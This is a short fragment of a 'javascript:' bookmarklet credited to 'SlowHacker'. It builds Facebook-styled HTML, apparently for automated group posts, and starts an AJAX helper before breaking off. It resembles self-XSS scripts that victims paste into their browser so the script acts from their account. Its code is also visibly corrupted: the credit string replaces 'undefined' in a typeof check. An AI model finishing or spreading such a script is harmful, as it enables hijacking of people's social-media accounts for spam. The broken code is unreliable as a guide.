javascript: var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>TEST</a></div></br>";
...
jx = {
    getHTTPObject: function () {
        var A = false;
        if (typeof ActiveXObject != "Code By SlowHacker Edit") try {
